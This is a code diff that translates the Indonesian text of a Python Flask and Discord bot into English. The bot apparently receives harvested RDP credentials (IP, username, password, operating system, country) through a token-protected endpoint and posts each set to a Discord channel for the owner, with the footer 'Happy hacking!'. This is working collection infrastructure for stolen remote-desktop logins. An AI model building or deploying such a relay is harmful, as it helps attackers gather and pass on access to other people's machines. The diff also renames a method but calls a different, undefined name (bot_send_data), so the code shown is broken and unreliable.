@@ -12,14 +12,12 @@ from waitress import serve
 host = "0.0.0.0"
 port = 80
 
-token_discord_bot = (
-    ""
-)
+token_discord_bot = ""
 token_website = ""
 
-channel_id_kirim_data_ori = 1119851938767442020
+channel_id_send_data_ori = 1119851938767442020
 channel_log = 1120302555382169660
-pesan_log = True
+log_message = True
 
 app = Flask(__name__)
 app.env = "production"
@@ -32,9 +30,7 @@ ip_lock = defaultdict(threading.Lock)
 activities = [
     discord.Activity(type=discord.ActivityType.watching, name="Cracking the Code"),
     discord.Activity(type=discord.ActivityType.watching, name="github.com/adiyahoo"),
-    discord.Activity(
-        type=discord.ActivityType.watching, name="instagram.com/adi_yaksa_nvm"
-    ),
+    discord.Activity(type=discord.ActivityType.watching, name="instagram.com/adi_yaksa_nvm"),
 ]
 
 
@@ -49,86 +45,77 @@ async def on_ready():
     await bot.loop.create_task(change_activity())
 
 
-class PesanDiscord:
+class DiscordMessage:
     @staticmethod
-    async def masalah_1(channel_log_obj, ip):
-        await channel_log_obj.send(
-            f"Siapa nih yang nyoba nge-hack websitenya? BTW, ini IP-nya, cekidot: ```{ip}```"
-        )
+    async def issue_1(channel_log_obj, ip):
+        await channel_log_obj.send(f"Who's trying to hack the website? BTW, here's their IP: ```{ip}```")
 
     @staticmethod
-    async def masalah_2(channel_log_obj, error):
-        await channel_log_obj.send(
-            f"Terjadi kesalahan dengan kode, informasi error: ```{error}```"
-        )
+    async def issue_2(channel_log_obj, error):
+        await channel_log_obj.send(f"An error occurred with the code, error information: ```{error}```")
 
     @staticmethod
-    async def masalah_3(channel_log_obj, ip):
-        await channel_log_obj.send(
-            f"Ada user mencoba melakukan post data tanpa token: ```{ip}```"
-        )
+    async def issue_3(channel_log_obj, ip):
+        await channel_log_obj.send(f"A user attempted to post data without a token: ```{ip}```")
 
     @staticmethod
-    async def masalah_4(channel_log_obj, ip):
-        await channel_log_obj.send(f"Sudah limit post data btw makasih yah: ```{ip}```")
+    async def issue_4(channel_log_obj, ip):
+        await channel_log_obj.send(f"Reached the data post limit, thanks though: ```{ip}```")
 
     @staticmethod
     async def send_embed(channel, data):
         guild = channel.guild
         owner = guild.owner
-        embed = discord.Embed(title="Informasi Akun RDP", color=discord.Color.red())
-        embed.add_field(name="💻 Sistem Operasi", value=data["os"], inline=False)
+        embed = discord.Embed(title="RDP Account Information", color=discord.Color.red())
+        embed.add_field(name="💻 Operating System", value=data["os"], inline=False)
         embed.add_field(name="🌐 IP Address", value=data["ip"], inline=False)
         embed.add_field(name="👤 Username", value=data["username"], inline=False)
         embed.add_field(name="🔒 Password", value=data["password"], inline=False)
         embed.add_field(name="🌍 Country", value=data["country"], inline=False)
         embed.set_footer(text="Stay curious and keep exploring. Happy hacking! 😄")
-        info_message = f"Info akun RDP, bro! {owner.mention}"
+        info_message = f"RDP account info, bro! {owner.mention}"
         await channel.send(content=info_message, embed=embed)
 
 
-class BotDiscord:
+class DiscordBot:
     @staticmethod
-    def bot_kirim_pesan(data):
-        channel = bot.get_channel(channel_id_kirim_data_ori)
+    def bot_send_message(data):
+        channel = bot.get_channel(channel_id_send_data_ori)
         if channel is not None:
             asyncio.run_coroutine_threadsafe(
-                PesanDiscord.send_embed(channel, data), bot.loop
+                DiscordMessage.send_embed(channel, data), bot.loop
             )
             return True
         else:
-            print(f"Channel dengan ID {channel_id_kirim_data_ori} tidak ditemukan.")
-            return (
-                f"Channel dengan ID {channel_id_kirim_data_ori} tidak ditemukan.",
-                404,
-            )
+            print(f"Channel with ID {channel_id_send_data_ori} not found.")
+            return f"Channel with ID {channel_id_send_data_ori} not found.", 404
 
     @staticmethod
-    def bot_kirim_log(ip, error, masalah):
+    def bot_send_log(ip, error, issue):
         channel_log_obj = bot.get_channel(channel_log)
         if channel_log_obj is not None:
-            if pesan_log:
-                if masalah == 1:
+            if log_message:
+                if issue == 1:
                     asyncio.run_coroutine_threadsafe(
-                        PesanDiscord.masalah_1(channel_log_obj, ip), bot.loop
+                        DiscordMessage.issue_1(channel_log_obj, ip), bot.loop
                     )
-                elif masalah == 2:
+                elif issue == 2:
                     asyncio.run_coroutine_threadsafe(
-                        PesanDiscord.masalah_2(channel_log_obj, error), bot.loop
+                        DiscordMessage.issue_2(channel_log_obj, error), bot.loop
                     )
-                elif masalah == 3:
+                elif issue == 3:
                     asyncio.run_coroutine_threadsafe(
-                        PesanDiscord.masalah_3(channel_log_obj, ip), bot.loop
+                        DiscordMessage.issue_3(channel_log_obj, ip), bot.loop
                     )
-                elif masalah == 4:
+                elif issue == 4:
                     asyncio.run_coroutine_threadsafe(
-                        PesanDiscord.masalah_4(channel_log_obj, ip), bot.loop
+                        DiscordMessage.issue_4(channel_log_obj, ip), bot.loop
                     )
             else:
                 pass
         else:
-            print(f"Channel dengan ID {channel_log_obj} tidak ditemukan.")
-            return f"Channel dengan ID {channel_log_obj} tidak ditemukan.", 404
+            print(f"Channel with ID {channel_log_obj} not found.")
+            return f"Channel with ID {channel_log_obj} not found.", 404
 
 
 class Author(Resource):
@@ -158,11 +145,11 @@ class Author(Resource):
                             <p class="text-gray-600 text-sm">Backend Developer</p>
                         </div>
                     </div>
-                    <p class="mb-4">Script code ini disediakan secara gratis dan tidak dijual.</p>
+                    <p class="mb-4">This script code is provided for free and not for sale.</p>
                     <p class="mb-4">"Rankings don't define your true potential. Your ability to code and your passion for it speak volumes about your talent and determination. Embrace your coding skills, continue to learn and improve, and you'll unlock a world of opportunities beyond what any ranking can measure."</p>
                     <div class="flex items-center justify-center mb-4">
                         <i class="fab fa-github text-gray-500 mr-2"></i>
-                        <a href="https://github.com/AdiYahoo" class="text-gray-500">Link GitHub</a>
+                        <a href="https://github.com/AdiYahoo" class="text-gray-500">GitHub Link</a>
                     </div>
                     <div class="flex items-center justify-center mb-4">
                         <i class="fas fa-envelope text-red-500 mr-2"></i>
@@ -192,21 +179,21 @@ class GetData(Resource):
                 with ip_lock[ip]:
                     ip_counter[ip] += 1
                     if ip_counter[ip] <= 2:
-                        check_pesan = BotDiscord.bot_kirim_pesan(data)
-                        if check_pesan:
-                            return "Berhasil", 200
+                        check_message = DiscordBot.bot_send_data(data)
+                        if check_message:
+                            return "Success", 200
                     else:
-                        BotDiscord.bot_kirim_log(ip, None, 4)
-                        return "Limit tercapai mau ngespam?", 403
+                        DiscordBot.bot_send_log(ip, None, 4)
+                        return "Limit reached, trying to spam?", 403
             else:
-                BotDiscord.bot_kirim_log(ip, None, 1)
-                return "Token anda salah", 401
+                DiscordBot.bot_send_log(ip, None, 1)
+                return "Invalid token", 401
         except KeyError as e:
-            BotDiscord.bot_kirim_log(ip, None, 3)
-            return f"Terjadi kesalahan, pesan: {e}", 500
+            DiscordBot.bot_send_log(ip, None, 3)
+            return f"An error occurred, message: {e}", 500
         except Exception as e:
-            BotDiscord.bot_kirim_log(None, e, 2)
-            return f"Terjadi kesalahan, pesan: {e}", 500
+            DiscordBot.bot_send_log(None, e, 2)
+            return f"An error occurred, message: {e}", 500
 
 
 api.add_resource(Author, "/")
@@ -219,13 +206,13 @@ class RunApp:
         serve(app, host=host, port=port)
 
     @staticmethod
-    def run_bot_discord():
+    def run_discord_bot():
         bot.run(token_discord_bot)
 
 
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=RunApp.run_flask)
-    bot_thread = threading.Thread(target=RunApp.run_bot_discord)
+    bot_thread = threading.Thread(target=RunApp.run_discord_bot)
 
     flask_thread.start()
     bot_thread.start()
